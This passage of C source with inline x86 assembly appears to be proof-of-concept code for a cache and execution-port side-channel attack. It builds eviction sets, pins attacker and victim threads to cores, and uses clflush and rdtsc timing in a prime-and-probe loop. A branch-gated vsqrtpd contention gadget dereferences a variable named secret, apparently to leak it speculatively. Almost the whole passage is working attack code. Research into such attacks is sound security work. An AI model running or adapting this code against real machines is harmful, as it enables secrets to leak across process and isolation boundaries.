		//printf("[+][3] Single Thread Contention(0) Victim (A-B):  A'B[%0.4d] AB'[%0.4d] A'B'[%0.4d] AB[%0.4d]   expected[%0.4d/10000] vs dual[%0.4d/10000]\n", AnB_AB, ABn_AB, AnBn_AB, AB_AB, AnB_AB, ABn_AB);
		//printf("[+][3] Single Thread Contention(1) Victim (B-A):  A'B[%0.4d] AB'[%0.4d] A'B'[%0.4d] AB[%0.4d]   expected[%0.4d/10000] vs dual[%0.4d/10000]\n\n", AnB_BA, ABn_BA, AnBn_BA, AB_BA, ABn_BA, AnB_BA);
//		fflush(stdout);


		AnB_AB = 0;
		AB_AB = 0;
		AnBn_AB = 0;
		ABn_AB = 0;
		AnB_BA = 0;
		AB_BA = 0;
		AnBn_BA = 0;
		ABn_BA = 0;

//		if(1) printf("[+] Single Thread Victim LoadB Times: 0");

	 	for(int m = 0; m < 10000; m++) {

			int loadB_AB = test_eviction_setVictimAB(eviction_final, addrA, addrB, &timeA_AB, &timeB_AB);  
			int loadB_BA = test_eviction_setVictimBA(eviction_final, addrA, addrB, &timeA_BA, &timeB_BA);

			if(0 && m < 100) printf(", [%d,%d]", loadB_AB, loadB_BA);

			if(loadB_AB > 180 && loadB_AB < 210) {
				if(timeA_AB > cache_miss_treshold && timeB_AB > cache_miss_treshold) AnBn_AB++;
				if(timeA_AB > cache_miss_treshold && timeB_AB < cache_miss_treshold) AnB_AB++;
				if(timeA_AB < cache_miss_treshold && timeB_AB > cache_miss_treshold) ABn_AB++;
				if(timeA_AB < cache_miss_treshold && timeB_AB < cache_miss_treshold) AB_AB++;
			}

			if(debug && m < 20) {
				if(timeA_AB > cache_miss_treshold && timeB_AB < cache_miss_treshold) {
					printf("[+] Single Thread Pruned No Contention Victim (A-B): addrA = %d, addrB = %d\n", timeA_AB, timeB_AB); 
				}
				else {
					printf("[!] Single Thread Pruned No Contention Victim (A-B): addrA = %d, addrB = %d\n", timeA_AB, timeB_AB); 
				}
			}

			if(loadB_BA > 180 && loadB_BA < 210) {
				if(timeA_BA > cache_miss_treshold && timeB_BA > cache_miss_treshold) AnBn_BA++;
				if(timeA_BA > cache_miss_treshold && timeB_BA < cache_miss_treshold) AnB_BA++;
				if(timeA_BA < cache_miss_treshold && timeB_BA > cache_miss_treshold) ABn_BA++;
				if(timeA_BA < cache_miss_treshold && timeB_BA < cache_miss_treshold) AB_BA++;
			}

			if(debug && m < 20) {
				if(timeA_BA > cache_miss_treshold && timeB_BA < cache_miss_treshold) {
					printf("[+] Single Thread Pruned Contention Victim    (B-A): addrA = %d, addrB = %d\n", timeA_BA, timeB_BA); 
				}
				else {
					printf("[!] Single Thread Pruned Contention Victim    (B-A): addrA = %d, addrB = %d\n", timeA_BA, timeB_BA); 
				}
			}
		}

//		printf("\n\n");
//		fflush(stdout);

//		printf("[+][3] Single Thread Pruned No Contention Victim (A-B):  A'B[%0.4d] AB'[%0.4d] A'B'[%0.4d] AB[%0.4d]   expected[%0.4d/%0.4d] vs dual[%0.4d/%0.4d]\n", AnB_AB, ABn_AB, AnBn_AB, AB_AB, AnB_AB, AnB_AB+ABn_AB+AnBn_AB+AB_AB, ABn_AB, AnB_AB+ABn_AB+AnBn_AB+AB_AB);
//		printf("[+][3] Single Thread Pruned Contention Victim    (B-A):  A'B[%0.4d] AB'[%0.4d] A'B'[%0.4d] AB[%0.4d]   expected[%0.4d/%0.4d] vs dual[%0.4d/%0.4d]\n\n", AnB_BA, ABn_BA, AnBn_BA, AB_BA, ABn_BA, AnB_BA+ABn_BA+AnBn_BA+AB_BA, AnB_BA, AnB_BA+ABn_BA+AnBn_BA+AB_BA);
		fflush(stdout);
    
	}
	else {
//		printf("[+] BAD SET\n\n");
		//exit(1);
	}

	return static_BA;
}


/* EVSETS CODE */


void setaffinity(int cpu)
{
        cpu_set_t c;

        CPU_ZERO(&c);
        CPU_SET(cpu, &c);

        if (sched_setaffinity(0, sizeof(c), &c) < 0) {
                perror("sched_setaffinity");
		printf("ERROR\n");
                exit(1);
        }
}

void* clock_thread(void *p)
{
	setaffinity(CLK);
	
	while (1) {
		ticks++;
	}

	return 0;
}

inline void clflush(volatile void *p)
{
	asm volatile ("clflush (%0)" :: "r"(p));
}

#define SAMPLES 100
void* attacker_thread(void *p)
{


	void *addr1 = attackerAddr[0];
	void *addr2 = attackerAddr[1];
	void *addr3 = attackerAddr[2];
	void *addr4 = attackerAddr[3];
	void *addr5 = attackerAddr[4];
	void *addr6 = attackerAddr[5];
	void *addr7 = attackerAddr[6];
	void *addr8 = attackerAddr[7];
	void *addr9 = attackerAddr[8];
	void *addr10 = attackerAddr[9];
	void *addr11 = attackerAddr[10];
	void *addr12 = attackerAddr[11];
	void *addr13 = attackerAddr[12];
	void *addr14 = attackerAddr[13];
	void *addr15 = attackerAddr[14];
	void *addr16 = attackerAddr[15];
	void *addr17 = attackerAddr[16];
	void *addr18 = attackerAddr[17];
	void *addr19 = attackerAddr[18];
	void *addr20 = attackerAddr[19];
	void *addr21 = attackerAddr[20];
	void *addr22 = attackerAddr[21];
	void *addrA = attackerAddr[22];
	void *addrB = attackerAddr[23];


	int latenci[12];
	setaffinity(atk_id);
	uint32_t lo1,hi1,lo2,hi2;
	uint64_t time1,time2,timet1,timet2;
	uint32_t temp;

	uint64_t time2s[SAMPLES];
	uint64_t diffs[SAMPLES];

	uint64_t start_interval[SAMPLES];
	uint64_t first_time[SAMPLES];
	uint64_t second_time[SAMPLES];

//	while(flag != 3) {}
//  flag = 2;
 
	// Synchronize
  /*unsigned int loa,hia;
  __asm__ __volatile__ ("rdtsc" : "=a" (loa), "=d" (hia));
  printf("\n\n TIME1 = %lld\n\n", ((uint64_t)hia << 32) | loa);*/
	uint64_t start;
	uint64_t sync;
	do {
		__asm__ __volatile__ ("rdtsc" : "=a" (lo1), "=d" (hi1));
		start = ((uint64_t)hi1 << 32) | lo1;
	}
	while((start >> 19) & 0x1);

	sync = ((start + (0x1 << 20)) >> 20) << 20;
	//printf("[1] start:%lld  check:%lld\n", start, sync);

	while((start >> 20) != (sync >> 20)) {
    		__asm__ __volatile__ ("rdtsc" : "=a" (lo1), "=d" (hi1));
		start = ((uint64_t)hi1 << 32) | lo1;
	}  
	sync = start;
	//printf("[1] Sync: %llx\n", start);
	
	//prime


/*__asm__ __volatile__ ("rdtsc" : "=a" (loa), "=d" (hia));
printf("\n\n TIME1 = %lld\n\n", ((uint64_t)hia << 32) | loa); */  
    
	_mm_clflush(addr1);
	_mm_clflush(addr2);
	_mm_clflush(addr3);
	_mm_clflush(addr4);
	_mm_clflush(addr5);
	_mm_clflush(addr6);
	_mm_clflush(addr7);
	_mm_clflush(addr8);
	_mm_clflush(addr9);
	_mm_clflush(addr10);
	_mm_clflush(addr11);
	_mm_clflush(addrA);
	_mm_clflush(addrB);
	_mm_clflush(addr12);
	_mm_clflush(addr13);
	_mm_clflush(addr14);
	_mm_clflush(addr15);
	_mm_clflush(addr16);
	_mm_clflush(addr17);
	_mm_clflush(addr18);
	_mm_clflush(addr19);
	_mm_clflush(addr20);
	_mm_clflush(addr21);
	_mm_clflush(addr22);
        
	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);
//	maccess(addrA);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);


	asm volatile("lfence\n");
	//prime

	flag = 1;

	while(flag == 1) {}


	//probe
	asm volatile("lfence\n");

	maccess(addr12);
	asm volatile("lfence\n");
	maccess(addr13);
	asm volatile("lfence\n");
	maccess(addr14);
	asm volatile("lfence\n");
	maccess(addr15);
	asm volatile("lfence\n");
	maccess(addr16);
	asm volatile("lfence\n");
	maccess(addr17);
	asm volatile("lfence\n");
	maccess(addr18);
	asm volatile("lfence\n");
	maccess(addr19);
	asm volatile("lfence\n");
	maccess(addr20);
	asm volatile("lfence\n");
	maccess(addr21);
	asm volatile("lfence\n");

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);
	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);
	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);


	latenci[0] = time_access(addr12);
	latenci[1] = time_access(addr13);
	latenci[2] = time_access(addr14);
	latenci[3] = time_access(addr15);
	latenci[4] = time_access(addr16);
	latenci[5] = time_access(addr17);
	latenci[6] = time_access(addr18);
	latenci[7] = time_access(addr19);
	latenci[8] = time_access(addr20);
	latenci[9] = time_access(addr21);
	latenci[10] = time_access(addrA);
	latenci[11] = time_access(addrB);

	if(debug) {
		printf("EV11   %d\n", latenci[0]);  
		printf("EV12   %d\n", latenci[1]);  
		printf("EV13   %d\n", latenci[2]);  
		printf("EV14   %d\n", latenci[3]);  
		printf("EV15   %d\n", latenci[4]);  
		printf("EV16   %d\n", latenci[5]);  
		printf("EV17   %d\n", latenci[6]);  
		printf("EV18   %d\n", latenci[7]);  
		printf("EV19   %d\n", latenci[8]);  
		printf("EV20   %d\n", latenci[9]);  
		printf("addrA  %d\n", latenci[10]);  
		printf("addrB  %d\n", latenci[11]); 
		printf("\n");
	}
	fflush(stdout);	
	//probe
	timeA = latenci[10];
	timeB = latenci[11];
	flag = 7;
 

	pthread_exit(NULL);

	return temp;
}

static unsigned int asm_contention(void){
    volatile unsigned int *s = &secret;
    volatile unsigned int ****b = &brcondptrptrptr;
    //volatile unsigned int ***b = &brcondptrptr;
    //volatile unsigned int **b = &brcondptr;
    volatile unsigned int *m = &mask;
    unsigned int *check = &bcheck;
    unsigned int *chess = &chessboard;

    void *addr1 = attackerAddr[0];
    void *addr2 = attackerAddr[1];
    void *addr3 = attackerAddr[2];
    void *addr4 = attackerAddr[3];
    void *addr5 = attackerAddr[4];
    void *addr6 = attackerAddr[5];
    void *addr7 = attackerAddr[6];
    void *addr8 = attackerAddr[7];
    void *addr9 = attackerAddr[8];
    void *addr10 = attackerAddr[9];
    void *addr11 = attackerAddr[10];
    void *addr12 = attackerAddr[11];
    void *addr13 = attackerAddr[12];
    void *addr14 = attackerAddr[13];
    void *addr15 = attackerAddr[14];
    void *addr16 = attackerAddr[15];
    void *addr17 = attackerAddr[16];
    void *addr18 = attackerAddr[17];
    void *addr19 = attackerAddr[18];
    void *addr20 = attackerAddr[19];
    void *addr21 = attackerAddr[20];
    void *addr22 = attackerAddr[21];	
    void *addrA = attackerAddr[22];
    void *addrB = attackerAddr[23];
    unsigned int *indicies = &array[0];
    double *values = &val_array[0];
    unsigned int cycle;
    volatile unsigned int *t = &ticks;

    asm(
        R"(

        mov %3, %%rdx
        movl (%%rdx), %%eax
        mov (%7), %%rbx
        clflush 64(%7)

        vzeroall
        lfence
        lfence
        lfence
        movl (%5), %%r11d
        movl (%6), %%r12d
        mov %4, %%r8
        mov %3, %%rdx

        mov (%1), %%rbx
        clflush (%1)
        mov (%%rbx), %%rcx
        clflush (%%rbx)
        mov %%rcx, %%rbx
        mov (%%rbx), %%rcx
        clflush (%%rbx)
        mov %%rcx, %%rbx
        mov (%%rbx), %%rcx
        clflush (%%rbx)
        mov %%rcx, %%rbx


        mov (%%r8), %%rbx
        clflush (%%r8)
        mov (%%rbx), %%rax
        clflush (%%rbx) 
        mov (%%rax), %%rbx
        clflush (%%rax) 


        .REPT	1024
            NOP
        .ENDR



        lfence

        mov (%1), %%rbx
        mov (%%rbx), %%rbx
        mov (%%rbx), %%rbx
        mov (%%rbx), %%rbx
        mov (%%rbx), %%rbx
        mov (%%rbx), %%rbx

        .REPT   40 #OBABE	
            vsqrtpd %%ymm1,%%ymm1
        .ENDR
        vmovq %%xmm1, %%rax
        movl (%0,%%rax,1), %%ecx


        mov (%%r8), %%rbx
        mov (%%rbx), %%rbx
        mov (%%rbx), %%rbx
        mov (%%rbx), %%rax
        cmp %%eax, %%r11d
        jle done%=



        movl (%%rdx), %%eax
        movl (%7,%%rax,8), %%eax
        vmovq %%rax, %%xmm2

        .REPT	8
            vsqrtpd %%ymm2,%%ymm3
            vsqrtpd %%ymm2,%%ymm4
            vsqrtpd %%ymm2,%%ymm5
            vsqrtpd %%ymm2,%%ymm6
            vsqrtpd %%ymm2,%%ymm7
            vsqrtpd %%ymm2,%%ymm8
            vsqrtpd %%ymm2,%%ymm9
            vsqrtpd %%ymm2,%%ymm10
            vsqrtpd %%ymm2,%%ymm11
            vsqrtpd %%ymm2,%%ymm12
            vsqrtpd %%ymm2,%%ymm13
            vsqrtpd %%ymm2,%%ymm14
            vsqrtpd %%ymm2,%%ymm15 
        .ENDR	


        done%=: movl %%ecx, %2
                clflush (%4)
                clflush (%5)
                clflush (%6)
                clflush (%%rbx)
        )"
        : "+r"(addrA), "+r"(bppppp), "=r"(cycle), "+r"(s), "+r"(b), "+r"(check), "+r"(m), "+r"(chess)
        : 
        : "%r11", "%r12", "%rax", "%rbx", "%rcx", "%r8", "%rdx", "%ymm0", "%ymm1", "%ymm2", "%ymm3", "%ymm4", "%ymm5", "%ymm6", "%ymm7", "%ymm8", "%ymm9", "%ymm10", "%ymm11", "%ymm12", "%ymm13", "%ymm14", "%ymm15"
	);


  return cycle;
}

void* attacker_thread12(void *p)
{


	void *addr1 = attackerAddr[0];
	void *addr2 = attackerAddr[1];
	void *addr3 = attackerAddr[2];
	void *addr4 = attackerAddr[3];
	void *addr5 = attackerAddr[4];
	void *addr6 = attackerAddr[5];
	void *addr7 = attackerAddr[6];
	void *addr8 = attackerAddr[7];
	void *addr9 = attackerAddr[8];
	void *addr10 = attackerAddr[9];
	void *addr11 = attackerAddr[10];
	void *addr12 = attackerAddr[11];
	void *addr13 = attackerAddr[12];
	void *addr14 = attackerAddr[13];
	void *addr15 = attackerAddr[14];
	void *addr16 = attackerAddr[15];
	void *addr17 = attackerAddr[16];
	void *addr18 = attackerAddr[17];
	void *addr19 = attackerAddr[18];
	void *addr20 = attackerAddr[19];
	void *addr21 = attackerAddr[20];
	void *addr22 = attackerAddr[21];
	void *addrA = attackerAddr[22];
	void *addrB = attackerAddr[23];


	int latenci[16];
	setaffinity(atk_id);
	uint32_t lo1,hi1,lo2,hi2;
	uint64_t time1,time2,timet1,timet2;
	uint32_t temp;

	uint64_t time2s[SAMPLES];
	uint64_t diffs[SAMPLES];

	uint64_t start_interval[SAMPLES];
	uint64_t first_time[SAMPLES];
	uint64_t second_time[SAMPLES];

//	while(flag != 3) {}
//  flag = 2;

  unsigned int loa1,hia1,lob1,hib1;
  __asm__ __volatile__ ("rdtsc" : "=a" (loa1), "=d" (hia1));
  brcond = 10;
  for(int i = 0; i < LOOPS; i++){
     asm_contention();
  }
  __asm__ __volatile__ ("rdtsc" : "=a" (lob1), "=d" (hib1));
  if(timez) printf("\n\n TIME1 = %lld\n\n", (((uint64_t)hib1 << 32) | lob1 ) - (((uint64_t)hia1 << 32) | loa1));
  
  syncflag = 1;
  while(syncflag != 2){}
 
	// Synchronize
  /*unsigned int loa,hia;
  __asm__ __volatile__ ("rdtsc" : "=a" (loa), "=d" (hia));
  printf("\n\n TIME1 = %lld\n\n", ((uint64_t)hia << 32) | loa);*/
	uint64_t start;
	uint64_t sync;
	do {
		__asm__ __volatile__ ("rdtsc" : "=a" (lo1), "=d" (hi1));
		start = ((uint64_t)hi1 << 32) | lo1;
	}
	while((start >> 19) & 0x1);

	sync = ((start + (0x1 << 20)) >> 20) << 20;
	//printf("[1] start:%lld  check:%lld\n", start, sync);

	while((start >> 20) != (sync >> 20)) {
    		__asm__ __volatile__ ("rdtsc" : "=a" (lo1), "=d" (hi1));
		start = ((uint64_t)hi1 << 32) | lo1;
	}  
	sync = start;
	//printf("[1] Sync: %llx\n", start);

	//prime
  unsigned int loa,hia,lob,hib;
  __asm__ __volatile__ ("rdtsc" : "=a" (loa), "=d" (hia));




/*__asm__ __volatile__ ("rdtsc" : "=a" (loa), "=d" (hia));
printf("\n\n TIME1 = %lld\n\n", ((uint64_t)hia << 32) | loa); */  
    
	_mm_clflush(addr1);
	_mm_clflush(addr2);
	_mm_clflush(addr3);
	_mm_clflush(addr4);
	_mm_clflush(addr5);
	_mm_clflush(addr6);
	_mm_clflush(addr7);
	_mm_clflush(addr8);
	_mm_clflush(addr9);
	_mm_clflush(addr10);
	_mm_clflush(addr11);	
	
	_mm_clflush(addrA);
	_mm_clflush(addrB);
	
	
	_mm_clflush(addr12);
	_mm_clflush(addr13);
	_mm_clflush(addr14);
	_mm_clflush(addr15);
    _mm_clflush(addr16);
	_mm_clflush(addr17);
	_mm_clflush(addr18);
	_mm_clflush(addr19);
	_mm_clflush(addr20);
	_mm_clflush(addr21);
	_mm_clflush(addr22);
        
	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);
//	maccess(addrA);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);


	asm volatile("lfence\n");
	//prime

	flag = 1;
	while(flag == 1) {}


	//probe
	asm volatile("lfence\n");

    maccess(addr12);
	asm volatile("lfence\n");
	maccess(addr13);
	asm volatile("lfence\n");
	maccess(addr14);
	asm volatile("lfence\n");
	maccess(addr15);
	asm volatile("lfence\n");
	maccess(addr16);
	asm volatile("lfence\n");
	maccess(addr17);
	asm volatile("lfence\n");
	maccess(addr18);
	asm volatile("lfence\n");
	maccess(addr19);
	asm volatile("lfence\n");
	maccess(addr20);
	asm volatile("lfence\n");
	maccess(addr21);
	asm volatile("lfence\n");
	maccess(addr22);
	asm volatile("lfence\n");

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);


	latenci[0] = time_access(addr12);
	latenci[1] = time_access(addr13);
	latenci[2] = time_access(addr14);
	latenci[3] = time_access(addr15);
	latenci[4] = time_access(addr16);
	latenci[5] = time_access(addr17);
	latenci[6] = time_access(addr18);
	latenci[7] = time_access(addr19);
	latenci[8] = time_access(addr20);
	latenci[9] = time_access(addr21);
	latenci[10] = time_access(addrA);
	latenci[11] = time_access(addrB);

  __asm__ __volatile__ ("rdtsc" : "=a" (lob), "=d" (hib));
  if(timez) printf("\n\n TIME2 = %lld\n\n", (((uint64_t)hib << 32) | lob ) - (((uint64_t)hia << 32) | loa));
  
	if(debug) {
		printf("EV11   %d\n", latenci[0]);  
		printf("EV12   %d\n", latenci[1]);  
		printf("EV13   %d\n", latenci[2]);  
		printf("EV14   %d\n", latenci[3]);  
		printf("EV15   %d\n", latenci[4]);  
		printf("EV16   %d\n", latenci[5]);  
		printf("EV17   %d\n", latenci[6]);  
		printf("EV18   %d\n", latenci[7]);  
		printf("EV19   %d\n", latenci[8]);  
		printf("EV20   %d\n", latenci[9]);  
		printf("addrA  %d\n", latenci[10]);  
		printf("addrB  %d\n", latenci[11]); 
		printf("\n");
	}
	fflush(stdout);	
	//probe
	timeA = latenci[10];
	timeB = latenci[11];
	flag = 7;
 
  __asm__ __volatile__ ("rdtsc" : "=a" (lo1), "=d" (hi1));
	long long end = ((uint64_t)hi1 << 32) | lo1; 

	//printf("[1] Sync: %llx, End: %llx\n", start, end);
  //fflush(stdout);
	pthread_exit(NULL);

	return temp;
}

void* victim_threadAB(void)
{
	void *addr1 = attackerAddr[0];
	void *addr2 = attackerAddr[1];
	void *addr3 = attackerAddr[2];
	void *addr4 = attackerAddr[3];
	void *addr5 = attackerAddr[4];
	void *addr6 = attackerAddr[5];
	void *addr7 = attackerAddr[6];
	void *addr8 = attackerAddr[7];
	void *addr9 = attackerAddr[8];
	void *addr10 = attackerAddr[9];
	void *addr11 = attackerAddr[10];
	void *addr12 = attackerAddr[11];
	void *addr13 = attackerAddr[12];
	void *addr14 = attackerAddr[13];
	void *addr15 = attackerAddr[14];
	void *addr16 = attackerAddr[15];
	void *addr17 = attackerAddr[16];
	void *addr18 = attackerAddr[17];
	void *addr19 = attackerAddr[18];
	void *addr20 = attackerAddr[19];
	void *addr21 = attackerAddr[20];
	void *addr22 = attackerAddr[21];
	void *addrA = attackerAddr[22];
	void *addrB = attackerAddr[23];

	setaffinity(VIC);
	_mm_clflush(addr1);
	_mm_clflush(addr2);
	_mm_clflush(addr3);
	_mm_clflush(addr4);
	_mm_clflush(addr5);
	_mm_clflush(addr6);
	_mm_clflush(addr7);
	_mm_clflush(addr8);
	_mm_clflush(addr9);
	_mm_clflush(addr10);
	_mm_clflush(addr11);
	_mm_clflush(addrA);
	_mm_clflush(addrB);
	_mm_clflush(addr12);
	_mm_clflush(addr13);
	_mm_clflush(addr14);
	_mm_clflush(addr15);
	_mm_clflush(addr16);
	_mm_clflush(addr17);
	_mm_clflush(addr18);
	_mm_clflush(addr19);
	_mm_clflush(addr20);
	_mm_clflush(addr21);
	_mm_clflush(addr22);
	uint32_t lo1,hi1,lo2,hi2;
	uint64_t time1,time2,timet1,timet2;
	uint32_t temp;

	uint64_t time2s[SAMPLES];
	uint64_t diffs[SAMPLES];

	uint64_t start_interval[SAMPLES];
	uint64_t first_time[SAMPLES];
	uint64_t second_time[SAMPLES];

	// Synchronize

	uint64_t start;
	uint64_t sync;
	do {
		__asm__ __volatile__ ("rdtsc" : "=a" (lo1), "=d" (hi1));
		start = ((uint64_t)hi1 << 32) | lo1;
	}
	while((start >> 19) & 0x1);

	sync = ((start + (0x1 << 20)) >> 20) << 20;
	//printf("[1] start:%lld  check:%lld\n", start, sync);

	while((start >> 20) != (sync >> 20)) {
    		__asm__ __volatile__ ("rdtsc" : "=a" (lo1), "=d" (hi1));
		start = ((uint64_t)hi1 << 32) | lo1;
	}  
	sync = start;
	//printf("[2] Sync: %llx\n", start);


	while(flag != 1){};
	
	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
